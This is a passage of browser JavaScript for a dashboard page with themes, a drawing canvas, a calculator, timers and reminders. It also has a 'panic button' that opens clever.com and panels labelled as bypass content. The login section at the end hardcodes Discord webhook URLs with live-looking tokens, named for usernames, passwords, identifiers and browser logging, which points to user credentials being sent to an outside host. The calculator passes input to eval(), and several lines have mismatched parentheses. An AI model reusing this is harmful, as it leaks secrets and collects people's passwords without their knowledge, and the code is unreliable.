        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        const themes = ['dark-theme', 'light-theme', 'blue-theme', 'green-theme', 'purple-theme'];
        let currentThemeIndex = 0;

        // Load theme from localStorage
        const savedTheme = localStorage.getItem('dashboardTheme');
        if (savedTheme && themes.includes(savedTheme)) {
          dashboard.currentTheme = savedTheme;
          currentThemeIndex = themes.indexOf(savedTheme);
        } else {
          dashboard.currentTheme = 'dark-theme'; // Default
        }
        
        dashboard.applyTheme(dashboard.currentTheme);
        themeBtn.innerText = `💡 ${dashboard.currentTheme.replace('-', ' ').replace('theme', 'Mode')}`;

        themeBtn.addEventListener('click', () => {
          currentThemeIndex = (currentThemeIndex + 1) % themes.length;
          dashboard.currentTheme = themes[currentThemeIndex];
          dashboard.applyTheme(dashboard.currentTheme);
          themeBtn.innerText = `💡 ${dashboard.currentTheme.replace('-', ' ').replace('theme', 'Mode')}`;
          localStorage.setItem('dashboardTheme', dashboard.currentTheme);
          activityLogger.addLog(`Theme changed to ${dashboard.currentTheme}`);
          statsTracker.increment('togglesUsed');
        });
      },

      applyTheme: function(theme) {
        document.body.className = `dashboard-body ${theme}`;
      },
      
      initButtons: function() {
        const elements = [
          {id: 'panicBtn', action: () => { window.open('https://clever.com', '_blank'); activityLogger.addLog('Panic button pressed'); statsTracker.increment('buttonsPressed'); }},
          {id: 'loginPanicBtn', action: () => { window.open('https://clever.com', '_blank'); activityLogger.addLog('Panic button pressed from login page'); statsTracker.increment('buttonsPressed'); }},
          {id: 'restartBtn', action: () => { 
            if(confirm('Are you sure you want to kill the page (restart)?')) {
              document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
              activityLogger.addLog('Page restart initiated');
              statsTracker.increment('buttonsPressed');
            }
          }},
          {id: 'fixIssuesBtn', action: () => { alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!'); activityLogger.addLog('Fix Issues button pressed'); statsTracker.increment('buttonsPressed'); }},
          {id: 'fullScreenBtn', action: () => { 
            if (!document.fullscreenElement) {
              document.documentElement.requestFullscreen().catch(err => {
                alert(`Error attempting to enable full-screen mode: ${err.message}`);
              });
              activityLogger.addLog('Full screen enabled');
            } else {
              document.exitFullscreen();
              activityLogger.addLog('Full screen disabled');
            }
            statsTracker.increment('buttonsPressed');
          }},
          {id: 'logoutBtn', action: () => {
            if(confirm('Are you sure you want to log out?')) {
              window.location.reload(); // Simple reload for logout
              activityLogger.addLog('Logged out');
              statsTracker.increment('buttonsPressed');
            }
          }},
          {id: 'downloadActivityLogsBtn', action: () => { dashboard.downloadActivityLogs(); activityLogger.addLog('Download Activity Logs button pressed'); statsTracker.increment('buttonsPressed'); }},
          {id: 'searchButton', action: () => { dashboard.handleSearch(); activityLogger.addLog('Search button pressed'); statsTracker.increment('buttonsPressed'); }},
        ];

        elements.forEach(el => {
          const btn = document.getElementById(el.id);
          if (btn) btn.addEventListener('click', el.action);
        });

        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        const zoomIn = (event) => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
            activityLogger.addLog('Zoomed in');
          }
          if (event) statsTracker.increment('buttonsPressed');
        };
        const zoomOut = (event) => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
            activityLogger.addLog('Zoomed out');
          }
          if (event) statsTracker.increment('buttonsPressed');
        };
        
        document.getElementById('zoomInBtn')?.addEventListener('click', zoomIn);
        document.getElementById('loginZoomInBtn')?.addEventListener('click', zoomIn);
        document.getElementById('zoomOutBtn')?.addEventListener('click', zoomOut);
        document.getElementById('loginZoomOutBtn')?.addEventListener('click', zoomOut);
      },
      
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');
        const infoPanelsContainer = document.getElementById('infoPanelsContainer');

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          infoPanelsContainer.style.display = 'none';
          canvasContainer.style.display = 'block';
          activityLogger.addLog('Notes canvas opened');
          statsTracker.increment('buttonsPressed');
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
          infoPanelsContainer.style.display = 'block';
          activityLogger.addLog('Notes canvas closed');
          statsTracker.increment('buttonsPressed');
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const penColorInput = document.getElementById('penColor');
        const penThicknessInput = document.getElementById('penThickness');
        const toggleTextModeBtn = document.getElementById('toggleTextModeBtn');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;
        let isTextMode = false;
        let currentPenColor = penColorInput.value;
        let currentPenThickness = penThicknessInput.value;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          let clientX, clientY;
          if (evt.touches && evt.touches.length > 0) {
              clientX = evt.touches[0].clientX;
              clientY = evt.touches[0].clientY;
          } else {
              clientX = evt.clientX;
              clientY = evt.clientY;
          }
          return {
            x: clientX - rect.left,
            y: clientY - rect.top
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          if (isTextMode) {
            const pos = getPos(e);
            const text = prompt("Enter text:");
            if (text) {
              ctx.font = `${currentPenThickness * 5}px Arial`;
              ctx.fillStyle = currentPenColor;
              ctx.fillText(text, pos.x, pos.y);
              activityLogger.addLog(`Text added to canvas: "${text.substring(0, 20)}..."`);
            }
          } else {
            drawing = true;
            const pos = getPos(e);
            ctx.beginPath();
            ctx.moveTo(pos.x, pos.y);
          }
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          if (isTextMode) { /* Text mode on touch is complex, typically disabled or uses virtual keyboard */ } 
          else {
            drawing = true;
            const pos = getPos(e);
            ctx.beginPath();
            ctx.moveTo(pos.x, pos.y);
          }
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing || isTextMode) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = currentPenColor;
          ctx.lineWidth = currentPenThickness;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing || isTextMode) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = currentPenColor;
          ctx.lineWidth = currentPenThickness;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            drawing = false;
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          activityLogger.addLog('Notes canvas cleared');
          statsTracker.increment('canvasCleared');
          statsTracker.increment('buttonsPressed');
        });

        penColorInput.addEventListener('change', (e) => {
          currentPenColor = e.target.value;
          activityLogger.addLog(`Pen color changed to ${currentPenColor}`);
          statsTracker.increment('togglesUsed'); // Considered a 'toggle' for stats
        });

        penThicknessInput.addEventListener('change', (e) => {
          currentPenThickness = e.target.value;
          activityLogger.addLog(`Pen thickness changed to ${currentPenThickness}`);
          statsTracker.increment('togglesUsed'); // Considered a 'toggle' for stats
        });

        toggleTextModeBtn.addEventListener('click', () => {
          isTextMode = !isTextMode;
          toggleTextModeBtn.innerText = isTextMode ? '🖌️ Draw Mode' : 'Aa Text Mode';
          canvas.style.cursor = isTextMode ? 'text' : 'crosshair';
          activityLogger.addLog(`Notes mode toggled to ${isTextMode ? 'Text' : 'Draw'}`);
          statsTracker.increment('togglesUsed');
          statsTracker.increment('buttonsPressed');
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.getElementById('dashboard'); // Capture dashboard area
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            activityLogger.addLog('Screenshot taken');
            statsTracker.increment('buttonsPressed');
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          activityLogger.addLog('Notes exported');
          statsTracker.increment('buttonsPressed');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          if (mainGrid.style.display === 'none') {
            mainGrid.style.display = 'flex';
            updatesNotifications.style.display = 'flex';
            infoPanelsContainer.style.display = 'block';
            toggleBtn.innerText = '⬆️ Toggle Sections';
            activityLogger.addLog('Sections toggled on');
          } else {
            mainGrid.style.display = 'none';
            updatesNotifications.style.display = 'none';
            infoPanelsContainer.style.display = 'none';
            toggleBtn.innerText = '⬇️ Toggle Sections';
            activityLogger.addLog('Sections toggled off');
          }
          statsTracker.increment('buttonsPressed');
          statsTracker.increment('togglesUsed');
        });
      },
      
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });

        // Apply wifi level colors
        document.querySelectorAll('.wifi-entry').forEach(entry => {
            const levelDiv = entry.querySelector('div:nth-child(2)'); // Second div is Wifi Level
            if (levelDiv) {
                const level = levelDiv.textContent.toLowerCase();
                if (level === 'high') {
                    levelDiv.classList.add('wifi-level-high');
                } else if (level === 'medium') {
                    levelDiv.classList.add('wifi-level-medium');
                } else if (level === 'low') {
                    levelDiv.classList.add('wifi-level-low');
                } else {
                    levelDiv.classList.add('wifi-level-unknown');
                }
            }
        });
      },
      
      initQuickBar: function() {
        // Already handled by the panel toggle functions
      },

      handleSearch: function() {
        const searchInput = document.getElementById('searchBar');
        const query = searchInput.value.toLowerCase();
        let found = false;

        const panels = document.querySelectorAll('.info-panel, .box'); // Include main boxes and info panels

        for (const panel of panels) {
            const id = panel.id.toLowerCase();
            const textContent = panel.textContent.toLowerCase();

            if (id.includes(query) || textContent.includes(query)) {
                // If it's an info-panel, toggle it open
                if (panel.classList.contains('info-panel')) {
                    if (panel.style.display === 'none') {
                        this.togglePanel(panel.id);
                    }
                }
                
                panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
                found = true;
                activityLogger.addLog(`Searched for "${query}" and navigated to #${panel.id}`);
                break; // Stop at the first match
            }
        }

        if (!found) {
            alert(`No section or content found for "${query}".`);
            activityLogger.addLog(`Search for "${query}" found no results`);
        }
        searchInput.value = ''; // Clear search bar
      },
      
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        if (panel) {
          const isCurrentlyVisible = panel.style.display === 'block';
          // Close all other info-panels
          document.querySelectorAll('.info-panel').forEach(p => {
            if (p.id !== panelId) {
                p.style.display = 'none';
            }
          });
          // Toggle the clicked panel
          panel.style.display = isCurrentlyVisible ? 'none' : 'block';
          activityLogger.addLog(`Panel "${panelId}" ${isCurrentlyVisible ? 'closed' : 'opened'}`);
          if (!isCurrentlyVisible) {
            statsTracker.increment('panelsOpened');
          }
          statsTracker.increment('buttonsPressed');
        }
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        activityLogger.addLog(`iPad content "${contentId}" displayed`);
        statsTracker.increment('buttonsPressed');
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        activityLogger.addLog(`Bypass content "${contentId}" displayed`);
        statsTracker.increment('buttonsPressed');
      },

      // New Dashboard Functions
      showWelcomeNotification: function(username) {
        const notification = document.getElementById('dashboardWelcomeNotification');
        notification.innerHTML = `Welcome, <strong>${username}</strong>!`;
        notification.classList.add('show');
        setTimeout(() => {
          notification.classList.remove('show');
        }, 5000); // Notification disappears after 5 seconds
      },

      downloadActivityLogs: function() {
        const logs = activityLogger.getLogs().join('\n');
        const blob = new Blob([logs], { type: 'text/plain' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `activity_log_${new Date().toISOString()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        activityLogger.addLog('Activity logs downloaded');
      },

      updateActivityLogsDisplay: function() {
        const logContentDiv = document.getElementById('activityLogsContent');
        if (logContentDiv) {
          logContentDiv.innerHTML = '';
          activityLogger.getLogs().forEach(log => {
            const div = document.createElement('div');
            div.classList.add('log-entry');
            div.textContent = log;
            logContentDiv.appendChild(div);
          });
          logContentDiv.scrollTop = logContentDiv.scrollHeight; // Scroll to bottom
        }
      },

      clearActivityLogs: function() {
        activityLogger.clearLogs();
        activityLogger.addLog('Activity logs cleared');
        statsTracker.increment('buttonsPressed');
      },

      saveLoginHistory: function(username, userID) {
        const now = new Date().toLocaleString();
        const loginInfo = {
          timestamp: now,
          username: username,
          userID: userID
        };
        localStorage.setItem('lastLogin', JSON.stringify(loginInfo));
        activityLogger.addLog(`Login history saved for ${username}`);
      },

      loadLoginHistory: function() {
        const lastLoginInfo = localStorage.getItem('lastLogin');
        if (lastLoginInfo) {
          const { timestamp, username, userID } = JSON.parse(lastLoginInfo);
          document.getElementById('lastLoginTimestamp').textContent = timestamp;
          document.getElementById('lastLoginUser').textContent = username;
          document.getElementById('lastLoginID').textContent = userID;
        } else {
          document.getElementById('lastLoginTimestamp').textContent = 'No previous login found.';
        }
      },

      randomFacts: [
        "A group of owls is called a parliament.",
        "Honey never spoils.",
        "The shortest war in history lasted only 38 to 45 minutes.",
        "Octopuses have three hearts.",
        "The total weight of all ants on Earth is estimated to be equal to the total weight of all humans.",
        "Bananas are berries, but strawberries aren't.",
        "There are more stars in the universe than grains of sand on all the beaches on Earth."
      ],
      displayRandomFact: function() {
        const factText = document.getElementById('randomFactText');
        if (factText) {
          const randomIndex = Math.floor(Math.random() * this.randomFacts.length);
          factText.textContent = this.randomFacts[randomIndex];
          activityLogger.addLog('Displayed a random fact');
          statsTracker.increment('buttonsPressed');
        }
      },

      dailyQuotes: [
        "The only way to do great work is to love what you do. – Steve Jobs",
        "Believe you can and you're halfway there. – Theodore Roosevelt",
        "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
        "It always seems impossible until it's done. – Nelson Mandela",
        "Success is not final, failure is not fatal: It is the courage to continue that counts. – Winston Churchill"
      ],
      displayDailyQuote: function() {
        const quoteText = document.getElementById('dailyQuoteText');
        if (quoteText) {
          const randomIndex = Math.floor(Math.random() * this.dailyQuotes.length);
          quoteText.textContent = this.dailyQuotes[randomIndex];
          activityLogger.addLog('Displayed a daily quote');
          statsTracker.increment('buttonsPressed');
        }
      },

      // Calculator functionality
      calculatorDisplay: document.getElementById('calculatorDisplay'),
      currentCalculation: '',
      appendToCalcDisplay: function(value) {
        if (this.calculatorDisplay) {
            if (this.currentCalculation === '0' && value !== '.') {
                this.currentCalculation = value;
            } else {
                this.currentCalculation += value;
            }
            this.calculatorDisplay.textContent = this.currentCalculation;
            activityLogger.addLog(`Calculator input: ${value}`);
            statsTracker.increment('buttonsPressed');
        }
      },
      clearCalcDisplay: function() {
        if (this.calculatorDisplay) {
            this.currentCalculation = '0';
            this.calculatorDisplay.textContent = this.currentCalculation;
            activityLogger.addLog('Calculator cleared');
            statsTracker.increment('buttonsPressed');
        }
      },
      calculateResult: function() {
        if (this.calculatorDisplay) {
          try {
            const result = eval(this.currentCalculation); // Using eval for simplicity, for production, a safer parser is recommended.
            this.currentCalculation = result.toString();
            this.calculatorDisplay.textContent = this.currentCalculation;
            activityLogger.addLog(`Calculator calculated: ${result}`);
          } catch (e) {
            this.calculatorDisplay.textContent = 'Error';
            this.currentCalculation = '';
            activityLogger.addLog(`Calculator error: ${e.message}`);
          }
          statsTracker.increment('buttonsPressed');
        }
      },
      initCalculator: function() {
          // Calculator elements are set up with inline onclicks for simplicity here.
          // In a larger app, event listeners would be preferred.
          if (this.calculatorDisplay) {
              this.calculatorDisplay.textContent = '0'; // Initialize display
              this.currentCalculation = '0';
          }
      },

      // Unit Converter
      unitConversions: {
        'cm': {
          'm': (val) => val / 100,
          'km': (val) => val / 100000,
          'in': (val) => val / 2.54,
          'ft': (val) => val / 30.48,
          'cm': (val) => val
        },
        'm': {
          'cm': (val) => val * 100,
          'km': (val) => val / 1000,
          'in': (val) => val * 39.3701,
          'ft': (val) => val * 3.28084,
          'm': (val) => val
        },
        'km': {
          'cm': (val) => val * 100000,
          'm': (val) => val * 1000,
          'in': (val) => val * 39370.1,
          'ft': (val) => val * 3280.84,
          'km': (val) => val
        },
        'in': {
          'cm': (val) => val * 2.54,
          'm': (val) => val / 39.3701,
          'km': (val) => val / 39370.1,
          'ft': (val) => val / 12,
          'in': (val) => val
        },
        'ft': {
          'cm': (val) => val * 30.48,
          'm': (val) => val / 3.28084,
          'km': (val) => val / 3280.84,
          'in': (val) => val * 12,
          'ft': (val) => val
        }
      },
      convertUnit: function() {
        const value = parseFloat(document.getElementById('convertValue').value);
        const fromUnit = document.getElementById('convertFromUnit').value;
        const toUnit = document.getElementById('convertToUnit').value;
        const resultDiv = document.getElementById('unitResult');

        if (isNaN(value)) {
          resultDiv.textContent = 'Result: Invalid input';
          activityLogger.addLog('Unit converter: Invalid input');
          return;
        }

        if (this.unitConversions[fromUnit] && this.unitConversions[fromUnit][toUnit]) {
          const convertedValue = this.unitConversions[fromUnit][toUnit](value);
          resultDiv.textContent = `Result: ${convertedValue.toFixed(4)} ${toUnit}`;
          activityLogger.addLog(`Converted ${value} ${fromUnit} to ${convertedValue.toFixed(4)} ${toUnit}`);
        } else {
          resultDiv.textContent = 'Result: Conversion not supported';
          activityLogger.addLog(`Unit converter: Conversion not supported from ${fromUnit} to ${toUnit}`);
        }
        statsTracker.increment('buttonsPressed');
      },
      initUnitConverter: function() {
        document.getElementById('convertValue')?.addEventListener('input', () => this.convertUnit());
        document.getElementById('convertFromUnit')?.addEventListener('change', () => this.convertUnit());
        document.getElementById('convertToUnit')?.addEventListener('change', () => this.convertUnit());
        // Perform initial conversion on load
        this.convertUnit();
      },

      // Timer & Stopwatch
      updateTimerDisplay: function() {
        const hrs = String(Math.floor(this.stopwatchSeconds / 3600)).padStart(2, '0');
        const mins = String(Math.floor((this.stopwatchSeconds % 3600) / 60)).padStart(2, '0');
        const secs = String(this.stopwatchSeconds % 60).padStart(2, '0');
        document.getElementById('timerDisplay').textContent = `${hrs}:${mins}:${secs}`;
      },
      startStopwatch: function() {
        if (!this.stopwatchInterval) {
          this.stopwatchInterval = setInterval(() => {
            this.stopwatchSeconds++;
            this.updateTimerDisplay();
          }, 1000);
          activityLogger.addLog('Stopwatch started');
          statsTracker.increment('buttonsPressed');
        }
      },
      stopStopwatch: function() {
        clearInterval(this.stopwatchInterval);
        this.stopwatchInterval = null;
        activityLogger.addLog('Stopwatch stopped');
        statsTracker.increment('buttonsPressed');
      },
      resetStopwatch: function() {
        this.stopStopwatch();
        this.stopwatchSeconds = 0;
        this.updateTimerDisplay();
        activityLogger.addLog('Stopwatch reset');
        statsTracker.increment('buttonsPressed');
      },

      startCountdown: function() {
        if (this.countdownInterval && !this.isCountdownPaused) {
            return; // Already running and not paused
        }

        if (!this.isCountdownPaused) {
            const hours = parseInt(document.getElementById('countdownHours').value);
            const minutes = parseInt(document.getElementById('countdownMinutes').value);
            const seconds = parseInt(document.getElementById('countdownSeconds').value);
            this.countdownRemaining = (hours * 3600) + (minutes * 60) + seconds;
            this.countdownTargetTime = new Date().getTime() + (this.countdownRemaining * 1000);
        }

        if (this.countdownRemaining <= 0) {
            alert("Please set a countdown time greater than zero!");
            activityLogger.addLog('Countdown start failed: zero time');
            return;
        }

        this.isCountdownPaused = false;
        document.getElementById('startCountdownBtn').textContent = 'Resume Countdown';
        
        this.countdownInterval = setInterval(() => {
          const now = new Date().getTime();
          this.countdownRemaining = Math.max(0, Math.floor((this.countdownTargetTime - now) / 1000));
            
          const hrs = String(Math.floor(this.countdownRemaining / 3600)).padStart(2, '0');
          const mins = String(Math.floor((this.countdownRemaining % 3600) / 60)).padStart(2, '0');
          const secs = String(this.countdownRemaining % 60)).padStart(2, '0');
          document.getElementById('timerDisplay').textContent = `${hrs}:${mins}:${secs}`;

          if (this.countdownRemaining <= 0) {
            clearInterval(this.countdownInterval);
            this.countdownInterval = null;
            alert("Countdown finished!");
            document.getElementById('timerDisplay').textContent = "00:00:00";
            document.getElementById('startCountdownBtn').textContent = 'Start Countdown';
            activityLogger.addLog('Countdown finished');
          }
        }, 1000);
        activityLogger.addLog(`Countdown started for ${this.countdownRemaining} seconds`);
        statsTracker.increment('buttonsPressed');
      },
      pauseCountdown: function() {
        if (this.countdownInterval) {
          clearInterval(this.countdownInterval);
          this.countdownInterval = null;
          this.isCountdownPaused = true;
          document.getElementById('startCountdownBtn').textContent = 'Resume Countdown';
          activityLogger.addLog('Countdown paused');
          statsTracker.increment('buttonsPressed');
        }
      },
      resetCountdown: function() {
        clearInterval(this.countdownInterval);
        this.countdownInterval = null;
        this.isCountdownPaused = false;
        this.countdownRemaining = 0;
        document.getElementById('timerDisplay').textContent = "00:00:00";
        document.getElementById('countdownHours').value = 0;
        document.getElementById('countdownMinutes').value = 0;
        document.getElementById('countdownSeconds').value = 0;
        document.getElementById('startCountdownBtn').textContent = 'Start Countdown';
        activityLogger.addLog('Countdown reset');
        statsTracker.increment('buttonsPressed');
      },
      initTimerStopwatch: function() {
        document.getElementById('startStopwatchBtn')?.addEventListener('click', () => this.startStopwatch());
        document.getElementById('stopStopwatchBtn')?.addEventListener('click', () => this.stopStopwatch());
        document.getElementById('resetStopwatchBtn')?.addEventListener('click', () => this.resetStopwatch());
        document.getElementById('startCountdownBtn')?.addEventListener('click', () => this.startCountdown());
        document.getElementById('pauseCountdownBtn')?.addEventListener('click', () => this.pauseCountdown());
        document.getElementById('resetCountdownBtn')?.addEventListener('click', () => this.resetCountdown());
        
        // Ensure input values are numbers
        document.getElementById('countdownHours').addEventListener('change', (e) => e.target.value = Math.max(0, parseInt(e.target.value) || 0));
        document.getElementById('countdownMinutes').addEventListener('change', (e) => e.target.value = Math.max(0, Math.min(59, parseInt(e.target.value) || 0)));
        document.getElementById('countdownSeconds').addEventListener('change', (e) => e.target.value = Math.max(0, Math.min(59, parseInt(e.target.value) || 0)));
      },

      updateStatsDisplay: function() {
        document.getElementById('statsButtonsPressed').textContent = statsTracker.buttonsPressed;
        document.getElementById('statsTogglesUsed').textContent = statsTracker.togglesUsed;
        document.getElementById('statsPanelsOpened').textContent = statsTracker.panelsOpened;
        document.getElementById('statsCanvasCleared').textContent = statsTracker.canvasCleared;
        document.getElementById('statsLoginsAttempted').textContent = statsTracker.loginsAttempted;
        document.getElementById('statsSuccessfulLogins').textContent = statsTracker.successfulLogins;
      },
      resetStats: function() {
        statsTracker.resetSession();
        activityLogger.addLog('Session stats reset');
        statsTracker.increment('buttonsPressed');
      },

      // Media Hub (Proxy)
      loadYoutubeEmbed: function() {
        const embedInput = document.getElementById('youtubeEmbedInput');
        const embedContainer = document.getElementById('youtubeEmbedContainer');
        const url = embedInput.value.trim();

        if (url.includes('youtube.com/embed/')) {
          embedContainer.innerHTML = `<iframe width="560" height="315" src="${url}" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
          activityLogger.addLog(`YouTube video loaded: ${url.substring(0, 50)}...`);
        } else {
          embedContainer.innerHTML = `<p style="color: red;">Please enter a valid YouTube embed URL (e.g., https://www.youtube.com/embed/VIDEO_ID).</p>`;
          activityLogger.addLog(`Invalid YouTube URL entered: ${url}`);
        }
        statsTracker.increment('buttonsPressed');
      },

      // Reminders
      setReminder: function() {
        const text = document.getElementById('reminderText').value.trim();
        const minutes = parseInt(document.getElementById('reminderMinutes').value);

        if (!text || isNaN(minutes) || minutes <= 0) {
          alert("Please enter a valid reminder text and minutes.");
          return;
        }

        const reminderTime = new Date().getTime() + (minutes * 60 * 1000);
        const id = Date.now();
        const reminder = { id, text, minutes, reminderTime };
        this.reminders.push(reminder);
        this.saveReminders();
        this.updateReminderList();

        setTimeout(() => {
          alert(`Reminder: ${text}`);
          this.reminders = this.reminders.filter(r => r.id !== id);
          this.saveReminders();
          this.updateReminderList();
          activityLogger.addLog(`Reminder triggered: "${text}"`);
        }, minutes * 60 * 1000);

        document.getElementById('reminderText').value = '';
        document.getElementById('reminderMinutes').value = 1;
        activityLogger.addLog(`Reminder set: "${text}" in ${minutes} minutes`);
        statsTracker.increment('buttonsPressed');
      },
      saveReminders: function() {
        localStorage.setItem('dashboardReminders', JSON.stringify(this.reminders));
      },
      loadReminders: function() {
        const savedReminders = localStorage.getItem('dashboardReminders');
        if (savedReminders) {
          this.reminders = JSON.parse(savedReminders);
          this.reminders.forEach(reminder => {
            const now = new Date().getTime();
            if (reminder.reminderTime > now) {
              const delay = reminder.reminderTime - now;
              setTimeout(() => {
                alert(`Reminder: ${reminder.text}`);
                this.reminders = this.reminders.filter(r => r.id !== reminder.id);
                this.saveReminders();
                this.updateReminderList();
                activityLogger.addLog(`Reminder triggered (loaded from storage): "${reminder.text}"`);
              }, delay);
            } else {
              // If reminder time has passed, remove it
              this.reminders = this.reminders.filter(r => r.id !== reminder.id);
            }
          });
          this.saveReminders(); // Clean up expired reminders
          this.updateReminderList();
        }
      },
      updateReminderList: function() {
        const reminderList = document.getElementById('reminderList');
        if (reminderList) {
          reminderList.innerHTML = '';
          this.reminders.forEach(reminder => {
            const li = document.createElement('li');
            const remainingSeconds = Math.max(0, Math.floor((reminder.reminderTime - new Date().getTime()) / 1000));
            const hrs = String(Math.floor(remainingSeconds / 3600)).padStart(2, '0');
            const mins = String(Math.floor((remainingSeconds % 3600) / 60)).padStart(2, '0');
            const secs = String(remainingSeconds % 60)).padStart(2, '0');
            li.textContent = `"${reminder.text}" in ${hrs}:${mins}:${secs}`;
            
            const deleteBtn = document.createElement('button');
            deleteBtn.textContent = '❌';
            deleteBtn.style.marginLeft = '10px';
            deleteBtn.style.background = 'none';
            deleteBtn.style.border = 'none';
            deleteBtn.style.color = 'red';
            deleteBtn.style.cursor = 'pointer';
            deleteBtn.onclick = () => {
              this.reminders = this.reminders.filter(r => r.id !== reminder.id);
              this.saveReminders();
              this.updateReminderList();
              activityLogger.addLog(`Reminder deleted: "${reminder.text}"`);
              statsTracker.increment('buttonsPressed');
            };
            li.appendChild(deleteBtn);
            reminderList.appendChild(li);
          });
        }
      }
    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHoIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
